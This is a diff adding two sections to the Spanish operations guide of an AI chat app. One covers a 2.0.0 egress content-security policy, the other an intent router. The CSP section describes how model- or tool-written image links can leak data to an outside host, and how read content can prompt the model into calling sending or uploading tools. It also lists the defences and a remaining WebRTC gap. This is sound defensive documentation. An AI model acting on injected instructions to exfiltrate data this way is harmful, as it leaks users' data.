@@ -1,4 +1,4 @@
-<!-- i18n: source=docs/operations.md source-hash=59070b8b7354af025c1896ea0fadeeebabab0898 status=machine -->
+<!-- i18n: source=docs/operations.md source-hash=724d20cdc8980277aa35d56c21c50f5601a110b4 status=current -->
 # Operación de AI Prism
 
 [English](../operations.md) · [Português (Brasil)](../pt-BR/operations.md) · **Español**
@@ -1045,6 +1045,56 @@ conexión"). Visto en vivo; el permiso lo resolvió.
 ni el desenlace "sale apagado porque el gateway no reenvía" ni el origen de sandbox dedicado. La función sigue saliendo apagada
 por defecto, como se diseñó. Lo que esta verificación no cubrió: capturar una View en un turno de chat real (exige un servicio
 con credencial por usuario o con la identidad Databricks de quien llama) y la View ejecutando su puente dentro de una conversación real.
+
+---
+
+### 6.17 CSP de salida (2.0.0): permitir un origen, interruptor de emergencia, leer los logs
+
+Desde la 2.0.0 el navegador carga imágenes, fuentes, estilos, medios, conexiones y frames solo desde la propia app (más `data:` y `blob:`). Un texto que el modelo o una herramienta escribe en una respuesta, documento o deck (`![x](https://host/p.png?d=<datos>)`) ya no puede hacer que el navegador llame a un host externo sin ningún clic. Las versiones anteriores a la 2.0.0 no tienen esta protección: la respuesta a "¿estamos expuestos?" es **actualizar a la 2.0.0**.
+
+**Permitir un origen (un design system que de verdad usa una fuente o imagen remota).**
+- **Tarjeta de admin, sin nuevo deploy:** Configuración > Administradores > *Orígenes externos de recursos*. Agregue un origen `https://host[:puerto]` (sin comodín, ruta, dirección IP ni host de Databricks) y guarde. El cambio llega a todas las réplicas en unos 15 s y vale para las páginas cargadas después. Cada cambio queda en la traza de auditoría de admin (`egress.settings`).
+- **`app.yaml`, para infraestructura como código:** `EXTERNAL_ASSET_ORIGINS` (orígenes separados por espacio o coma). Es un piso: la tarjeta suma a él y no puede quitarlo. Una entrada inválida se descarta, nunca se emite.
+- Un origen permitido abre **solo** `img-src`, `font-src` y `style-src`. Nunca abre `connect-src`, `media-src`, `frame-src`, `default-src` ni `script-src`. Todo lo que un origen permitido recibe en una URL puede leerlo quien lo opera; agregue solo hosts que su organización controla, nunca alojamiento compartido ni servicios de formularios o de scripts. Un design system que necesita una biblioteca de scripts debe incluirla en el zip.
+
+**Interruptor de emergencia.** `CSP_EGRESS=report` en el `env` de `app.yaml` y redeploy **del mismo build** (sin rebuild; el `config.env` del bundle no llega a la app). El valor debe ser exactamente `report`: cualquier otro (`Report`, `report `, un error de tipeo) mantiene la CSP aplicada y escribe un aviso al arrancar. Quita solo la parte del navegador: las directivas de salida y de script salen del header aplicado y la política Report-Only sigue vigilando. **No** apaga las demás capas, que siguen activas: el marcador de imagen externa en el chat y los documentos, el sanitizador de decks (al guardar y al leer), la regla de URL de `web_fetch` y la regla del prompt de sistema. Úselo por poco tiempo, corrija la causa (normalmente un origen por permitir) y quítelo.
+
+**Leer los logs** (`databricks apps logs <app> -p <PROFILE>`; cada línea es un objeto JSON, vea el [§2](#2-logs)):
+
+```bash
+# el navegador bloqueó una carga (enforce) o la habría bloqueado (report): solo directiva y origen, nunca ruta ni query
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | startswith("csp report:")) | .msg | sub("^csp report: "; "") | fromjson | [.disposition, .directive, .blocked, (.document // "")] | @tsv' | sort | uniq -c | sort -rn
+
+# el servidor quitó o rechazó una referencia externa: superficie, tipo y host
+grep -o '{"ts".*}' app.log | jq -r 'select(.msg | contains("egress_blocked")) | .msg | fromjson | [.surface, .kind, (.hosts | join(","))] | @tsv' | sort | uniq -c | sort -rn
+```
+
+- `csp_violation` (`csp report: {...}`): `directive` (`img-src`, `font-src`, `style-src`, `script-src`...), `blocked` (el origen, o `inline`, `eval`, `data`, `blob`; recortado a 120 caracteres, así que un origen muy largo puede quedar cortado, sin marcador), `document` opcional (`about:srcdoc` para un frame) y `disposition` (`enforce` o `report`). Hay un límite por usuario (`CSP_REPORT_PER_MIN`, por defecto 60). Un origen `blocked` recurrente de un design system es la señal para permitirlo; un host desconocido que aparece justo después de un turno del modelo es el intento que esta versión detiene.
+- `egress_blocked`: `surface` (`answer`, `deck`, `document`, `web_fetch`), `kind` (`image`, `link`, `css`, `handler`, `url`), `hosts` (solo nombres de host), `count`, `route` y `truncated` cuando se alcanzó un tope de tamaño. Hay un límite por usuario (`EGRESS_LOG_PER_MIN`, por defecto 60; `0` = sin límite). `request_id` y `user_hash` vienen de la solicitud, así que la línea se liga al turno sin llevar el contenido.
+
+**Argumentos de herramientas (lo que la regla del navegador no cubre).** La CSP protege el navegador. Una herramienta corre en el servidor y puede enviar lo que el modelo le da:
+- Mantenga restrictiva la **política de red serverless** del workspace, para que la herramienta Python (función de UC) no tenga red de salida. La app no puede verificarlo por usted.
+- Revise qué **herramientas MCP externas** pueden escribir o publicar (enviar un mensaje, crear un ticket, mandar un correo, subir un archivo) y desactive las que no hagan falta (las conexiones MCP y la política de herramientas en Configuración). Un contenido que el modelo leyó puede pedirle que las llame.
+- La **búsqueda web** envía la consulta al proveedor que el admin eligió ([web-search.md](web-search.md)). `web_fetch` solo abre una URL que un usuario escribió o que un resultado de `web_search`/`web_fetch` listó; otros resultados de herramientas (Genie, MCP, archivos) no cuentan.
+
+**Residual conocido.** Un script en línea en un frame aislado (tarjetas de design system, slides) todavía puede abrir una conexión WebRTC (un paquete STUN llegó a un listener de loopback en una sonda con Chromium). La navegación del frame hacia un host externo la bloquea `frame-src`. Cerrar WebRTC exige esos frames en su propio origen y política (previsto para la 2.x).
+
+### 6.18 Enrutador de intención (2.0.0): `INTENT_ROUTER` y el endpoint OpenJev
+
+El turno decide de qué trata (presentación, documento, hoja de cálculo, imagen, datos de la empresa) con un clasificador Haiku en los turnos que las regex no pueden leer ([web-search.md](web-search.md) y la política de herramientas no cambian). El enrutador también puede consultar a OpenJev (Qwen3.5 4B en System One), un modelo pequeño de decisión que responde preguntas de sí/no en una sola solicitud por lotes (unos 0,3 s, unos US$ 0,04 por 1.000 turnos).
+
+| Variable | Valores | Efecto |
+|---|---|---|
+| `INTENT_ROUTER` | `race` (predeterminado), `shadow`, `haiku` | `race`: los dos salen juntos; cuando OpenJev está seguro, sus reglas deciden y la solicitud a Haiku se aborta, si no decide Haiku; si los dos fallan, deciden las regex. `shadow`: Haiku sigue decidiendo; OpenJev corre en paralelo, nunca se espera y solo escribe el evento de telemetría `intent_router`. `haiku`: solo el clasificador Haiku, como antes (la reversión). Cualquier otro valor equivale a `haiku`. |
+| `INTENT_OPENJEV_ENDPOINT` | predeterminado `system.ai.openjev-qwen35-4b` | El modelo System One que usan `shadow` y `race`. Un valor vacío apaga OpenJev. Si el workspace no tiene el endpoint (HTTP 404), el enrutador registra una línea `intent router: OpenJev endpoint not found`, usa Haiku y reintenta pasados 10 minutos. |
+
+`race` es el predeterminado, así que una instalación nueva funciona sin configurar nada (re-score offline en 40 ítems held-out: race 40/40, igual que Haiku, recall de presentación en pedidos multi-ruta 7/7). Para revertir, defina `INTENT_ROUTER=haiku` en el `env` de `app.yaml` (la línea comentada ya está) y haga el redeploy del mismo build; no hay migración, y eso es todo el rollback.
+
+- **Los fallos se registran:** un error HTTP, timeout, error de red o respuesta ilegible de OpenJev escribe un aviso `intent router: OpenJev <tipo>; the Haiku classifier decides this turn` por tipo cada 10 minutos (nunca el mensaje), y el turno sigue con Haiku.
+- **Lo que nunca hace:** quitar una herramienta habilitada o la búsqueda web. El veredicto de OpenJev sobre herramientas y web es una pista escrita en la telemetría, nada más.
+- **Ledger:** cada llamada a OpenJev es una fila `intent_openjev` (entrada US$ 0,042 por 1M de tokens, salida 0). El modelo no es de chat y nunca aparece en el selector. La llamada no lleva `usage_context`, así que no entra en el alcance por app del dashboard de costos.
+- **Telemetría:** un span `intent_router` por turno clasificado, con `mode`, `gate`, `regex`, `haiku`, `openjev_probs`, `resolved`, `confident`, `chosen_source` (`openjev`, `haiku` o `regex`), `ms_openjev`, `ms_haiku`, `haiku_empty`. Lleva solo probabilidades y decisiones, nunca el texto del mensaje.
+- **Antes de que `race` sea el predeterminado:** compare `resolved` con `haiku` en shadow (concordancia en las políticas de artefacto, proporción de turnos `confident`, p95 de `ms_openjev`).
 
 ---
 
